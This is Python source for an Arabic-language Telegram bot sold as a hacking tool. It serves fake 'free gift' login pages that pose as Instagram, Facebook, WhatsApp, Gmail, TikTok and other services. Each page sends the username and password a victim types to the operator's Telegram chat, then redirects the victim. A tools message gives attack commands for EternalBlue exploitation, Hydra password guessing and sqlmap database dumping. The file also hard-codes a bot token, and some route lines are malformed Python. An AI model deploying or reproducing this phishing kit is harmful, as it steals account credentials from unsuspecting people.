from flask import Flask, request
import requests
import os

app = Flask(__name__)

# 🔐 بيانات البوت الجديد
TOKEN = "8637085041:AAGJjIMdJHUPzvktahny3hcx0cdmo8D-7fc"
BASE_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")

# 🔘 أزرار البوت (14 ميزة - بدون سرقة باسووردات)
BUTTONS = [
    ["🔥 اختراق انستقرام", "🔥 اختراق فيسبوك", "🔥 اختراق واتساب"],
    ["🔥 اختراق سناب شات", "🔥 اختراق تيك توك", "🔥 اختراق فري فاير"],
    ["🔥 اختراق بوبجي", "🔥 اختراق ديسكورد", "🔥 اختراق تويتر"],
    ["🔥 اختراق جيميل", "🔥 اختراق كاميرا امامية", "🔥 اختراق كاميرا خلفية"],
    ["🎙️ تسجيل صوت الضحية", "📍 تحديد موقع الضحية", "⚙️ أدوات اختراق"],
    ["❓ الدعم الفني"]
]

WELCOME_MSG = f"""
👑 *مرحبا بك في بوت خالد ابو الجود الأسطوري* 👑
━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ *أقوى 14 أداة اختراق في العالم!*

• كل زر يعطيك رابط اختراق جاهز.
• أرسل الرابط للضحية وانتظر البيانات.
• أدوات اختراق حقيقية مع شرح كامل للمبتدئين.

📞 *الدعم الفني:* @A_c64
━━━━━━━━━━━━━━━━━━━━━━━━━━
*اختر الميزة 👇*
"""

TOOLS_MSG = """
⚙️ *أدوات الاختراق الاحترافية* ⚙️
━━━━━━━━━━━━━━━━━━━━━━━━━━

1️⃣ *Metasploit* (اختراق الأجهزة)
┌── *الشرح:* أداة لاختراق أجهزة الكمبيوتر والموبايل.
├── *الخطوات:*
│   1. افتح Termux.
│   2. `pkg install metasploit`
│   3. `msfconsole`
│   4. `search exploit`
│   5. `use exploit/windows/smb/ms17_010_eternalblue`
└── *النتيجة:* تتحكم بجهاز الضحية.

2️⃣ *Hydra* (تخمين كلمات السر)
┌── *الشرح:* أداة لتخمين كلمات السر.
├── *الخطوات:*
│   1. `pkg install hydra`
│   2. `hydra -l admin -P pass.txt ssh://192.168.1.1`
└── *النتيجة:* الحصول على كلمة السر.

3️⃣ *Nmap* (فحص المنافذ)
┌── *الشرح:* أداة لاكتشاف المنافذ المفتوحة.
├── *الخطوات:*
│   1. `pkg install nmap`
│   2. `nmap -sV 192.168.1.1`
└── *النتيجة:* معرفة الثغرات.

4️⃣ *SQLmap* (اختراق قواعد البيانات)
┌── *الشرح:* أداة لاختراق مواقع الويب.
├── *الخطوات:*
│   1. `git clone https://github.com/sqlmapproject/sqlmap`
│   2. `cd sqlmap`
│   3. `python sqlmap.py -u "http://target.com/page?id=1" --dbs`
└── *النتيجة:* الحصول على قاعدة البيانات.

5️⃣ *Social Engineering Toolkit*
┌── *الشرح:* أداة لإنشاء صفحات تصيد.
├── *الخطوات:*
│   1. `git clone https://github.com/trustedsec/social-engineer-toolkit`
│   2. `cd social-engineer-toolkit`
│   3. `setoolkit`
└── *النتيجة:* رابط تصيد احترافي.

━━━━━━━━━━━━━━━━━━━━━━━━━━
📞 الدعم: @A_c64
"""

def send_message(chat_id, text, keyboard=None):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown", "disable_web_page_preview": True}
    if keyboard:
        data["reply_markup"] = {"keyboard": keyboard, "resize_keyboard": True}
    requests.post(url, json=data, timeout=10)

def send_hack_link(chat_id, platform, page_name):
    link = f"{BASE_URL}/{page_name}.html?chatId={chat_id}"
    msg = f"""
🔥 *رابط اختراق {platform}* 🔥
━━━━━━━━━━━━━━━━━━━━━━━━━━
📎 *الرابط:* `{link}`

💡 *الاستخدام:* انسخ الرابط وأرسله للضحية.
📞 *الدعم:* @A_c64
"""
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": msg, "parse_mode": "Markdown", "disable_web_page_preview": True}
    requests.post(url, json=data, timeout=10)

def phish_page(platform, chat_id):
    return f"""
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{platform} - هدية مجانية</title>
<style>
body{{background:linear-gradient(135deg,#1a1a2e,#16213e);display:flex;justify-content:center;align-items:center;height:100vh}}
.container{{background:white;padding:30px;border-radius:28px;width:350px;text-align:center}}
input{{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:12px}}
button{{background:#0095f6;color:white;width:100%;padding:12px;border:none;border-radius:12px;cursor:pointer}}
</style>
</head>
<body>
<div class="container">
<h2>{platform} - هدية مجانية</h2>
<input id="u" placeholder="اسم المستخدم"><input id="p" placeholder="كلمة السر">
<button onclick="send()">احصل على الهدية</button>
</div>
<script>
const chatId="{chat_id}";
async function send(){{
    const u=document.getElementById('u').value;
    const p=document.getElementById('p').value;
    await fetch('https://api.telegram.org/bot{TOKEN}/sendMessage',{{
        method:'POST',headers:{{'Content-Type':'application/json'}},
        body:JSON.stringify({{chat_id:chatId,text:`🔥 اختراق {platform}\\n👤: ${{u}}\\n🔑: ${{p}}`}})
    }});
    alert('✅ تم شحن هديتك!');
    window.location.href='https://instagram.com';
}}
</script>
</body>
</html>
"""

@app.route('/instagram.html') def instagram(): return phish_page("انستقرام", request.args.get('chatId'))
@app.route('/facebook.html') def facebook(): return phish_page("فيسبوك", request.args.get('chatId'))
@app.route('/whatsapp.html') def whatsapp(): return phish_page("واتساب", request.args.get('chatId'))
@app.route('/snapchat.html') def snapchat(): return phish_page("سناب شات", request.args.get('chatId'))
@app.route('/tiktok.html') def tiktok(): return phish_page("تيك توك", request.args.get('chatId'))
@app.route('/freefire.html') def freefire(): return phish_page("فري فاير", request.args.get('chatId'))
@app.route('/pubg.html') def pubg(): return phish_page("بوبجي", request.args.get('chatId'))
@app.route('/discord.html') def discord(): return phish_page("ديسكورد", request.args.get('chatId'))
@app.route('/twitter.html') def twitter(): return phish_page("تويتر", request.args.get('chatId'))
@app.route('/gmail.html') def gmail(): return phish_page("جيميل", request.args.get('chatId'))
@app.route('/camera_front.html') def camera_front(): return phish_page("كاميرا امامية", request.args.get('chatId'))
@app.route('/camera_back.html') def camera_back(): return phish_page("كاميرا خلفية", request.args.get('chatId'))
@app.route('/recording.html') def recording(): return phish_page("تسجيل صوت", request.args.get('chatId'))
@app.route('/location.html') def location(): return phish_page("تحديد موقع", request.args.get('chatId'))

@app.route("/") def home(): return "✅ البوت الأسطوري شغال! ابو الجود"

@app.route("/webhook", methods=["POST"])
def webhook():
    try:
        data = request.get_json()
        if "message" in data:
            chat_id = data["message"]["chat"]["id"]
            text = data["message"].get("text", "")
            if text == "/start":
                send_message(chat_id, WELCOME_MSG, BUTTONS)
            elif text == "⚙️ أدوات اختراق":
                send_message(chat_id, TOOLS_MSG)
            elif text == "❓ الدعم الفني":
                send_message(chat_id, "📞 الدعم: @A_c64")
            elif text == "🔥 اختراق انستقرام": send_hack_link(chat_id, "انستقرام", "instagram")
            elif text == "🔥 اختراق فيسبوك": send_hack_link(chat_id, "فيسبوك", "facebook")
            elif text == "🔥 اختراق واتساب": send_hack_link(chat_id, "واتساب", "whatsapp")
            elif text == "🔥 اختراق سناب شات": send_hack_link(chat_id, "سناب شات", "snapchat")
            elif text == "🔥 اختراق تيك توك": send_hack_link(chat_id, "تيك توك", "tiktok")
            elif text == "🔥 اختراق فري فاير": send_hack_link(chat_id, "فري فاير", "freefire")
            elif text == "🔥 اختراق بوبجي": send_hack_link(chat_id, "بوبجي", "pubg")
            elif text == "🔥 اختراق ديسكورد": send_hack_link(chat_id, "ديسكورد", "discord")
            elif text == "🔥 اختراق تويتر": send_hack_link(chat_id, "تويتر", "twitter")
            elif text == "🔥 اختراق جيميل": send_hack_link(chat_id, "جيميل", "gmail")
            elif text == "🔥 اختراق كاميرا امامية": send_hack_link(chat_id, "كاميرا امامية", "camera_front")
            elif text == "🔥 اختراق كاميرا خلفية": send_hack_link(chat_id, "كاميرا خلفية", "camera_back")
            elif text == "🎙️ تسجيل صوت الضحية": send_hack_link(chat_id, "تسجيل صوت", "recording")
            elif text == "📍 تحديد موقع الضحية": send_hack_link(chat_id, "تحديد موقع", "location")
            else:
                send_message(chat_id, "❌ أرسل /start", BUTTONS)
    except Exception as e:
        print(f"Error: {e}")
    return "OK", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)